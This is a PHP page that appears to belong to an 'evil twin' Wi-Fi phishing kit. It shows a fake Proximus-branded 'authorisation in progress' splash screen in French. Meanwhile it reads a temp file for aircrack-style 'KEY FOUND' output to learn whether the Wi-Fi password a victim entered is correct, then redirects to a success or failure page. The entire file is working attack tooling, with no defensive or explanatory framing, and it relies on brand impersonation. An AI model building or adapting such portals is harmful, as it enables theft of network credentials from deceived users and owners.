<?php
// Set cache control headers
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Pragma: no-cache");
header("Expires: 0");

$filePath = '/tmp/airport_creds_tmp.txt';
$rueayPath = '/tmp/airport_rueay.txt';
$aclAllowPath = '/tmp/airport_aclallow.txt';

// Check if the file exists
if (file_exists($filePath)) {
    // Try to open the file
    $fileHandle = fopen($filePath, 'r');

    if ($fileHandle !== false) {
        // Display "Autorisation en cours, veuillez patienter..." in the center of the screen
        echo '<!DOCTYPE html>';
        echo '<html>';
        echo '<head>';
        echo '<style>';
        // Add background image
        echo 'body {';
        echo '  background-image: url("splash1.png");';
        echo '  background-size: cover;';
        echo '  background-position: center;';
        echo '  height: 100vh;';
        echo '  margin: 0;';
        echo '  display: flex;';
        echo '  justify-content: center;';
        echo '  align-items: center;';
        echo '  color: white;';
        echo '  font-family: Arial, sans-serif;';
        echo '  font-size: 20px;';
        echo '}';
        // Style for the Proximus logo image
        echo '.proximus-logo {';
        echo '  position: absolute;';
        echo '  top: 80px;'; // Adjusted position for Proximus logo
        echo '  left: 50%;';
        echo '  transform: translateX(-50%);';
        echo '  z-index: 10;';
        echo '  width: 200px;';
        echo '  height: auto;';
        echo '}';
        // Style for the message with colorful background and vibrant text
        echo '.message {';
        echo '  background: linear-gradient(135deg, #6A1B9A, #F06292, #64B5F6);'; // Colorful gradient
        echo '  padding: 20px;';
        echo '  border-radius: 10px;';
        echo '  text-align: center;';
        echo '  color: white;'; // White text color for good contrast
        echo '  font-size: 30px;';
        echo '  font-weight: bold;';
        echo '  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);'; // Shadow for better visibility
        echo '  max-width: 80%;';
        echo '  margin: 0 auto;';
        echo '  border: 3px solid white;'; // Optional: border for additional style
        echo '  text-transform: uppercase;'; // Make text uppercase
        echo '  letter-spacing: 2px;'; // Add letter spacing for a more stylish look
        echo '  animation: fadeIn 1.5s ease-in-out;';
        echo '}';
        // Animation for the message to fade in
        echo '@keyframes fadeIn {';
        echo '  0% { opacity: 0; transform: translateY(-20px); }';
        echo '  100% { opacity: 1; transform: translateY(0); }';
        echo '}';
        echo '</style>';
        echo '</head>';
        echo '<body>';
        
        // Display the Proximus logo on top
        echo '<img src="proximus.png" class="proximus-logo" alt="Proximus Logo">';
        
        // Display the message with enhanced styling
        echo '<div class="message">AUTORISATION EN COURS, VEUILLEZ PATIENTER…</div>';
        echo '</body>';
        echo '</html>';

        // Check if ACLAllow is checked
        $ACLAllowTrue = isset($_GET['ACLAllow']) && $_GET['ACLAllow'] == '1';

        if ($ACLAllowTrue) {
            // Write "true" to a new file
            file_put_contents($aclAllowPath, "true\n");
        } else {
            // If ACLAllow is not checked, overwrite the file with an empty string
            file_put_contents($aclAllowPath, '');
        }

        // Try to read the file line by line
        while (($line = fgets($fileHandle)) !== false) {
            // Use a more permissive regex to capture "KEY FOUND!" and ignore the rest
            if (preg_match('/KEY\s*FOUND/', $line, $matches)) {
                file_put_contents($rueayPath, "true\n");
                echo '<script>';
                echo 'setTimeout(function() {';
                echo '  window.location.href = "/correct.php";';
                echo '}, 1000);'; // 1000 milliseconds (1 second) delay
                echo '</script>';
                fclose($fileHandle);
                exit(); // Exit the script after redirecting
            }
        }

        // Close the file handle
        fclose($fileHandle);

        // If "KEY FOUND!" was not found in any line
        file_put_contents($rueayPath, "false\n");
        echo '<script>';
        echo 'setTimeout(function() {';
        echo '  window.location.href = "/incorrect.php";';
        echo '}, 1000);'; // 1000 milliseconds (1 second) delay
        echo '</script>';
    } else {
        // Error opening the file
        echo 'Error opening the file: ' . $filePath;
    }
} else {
    // File does not exist
    echo 'File not found: ' . $filePath;
}
?>
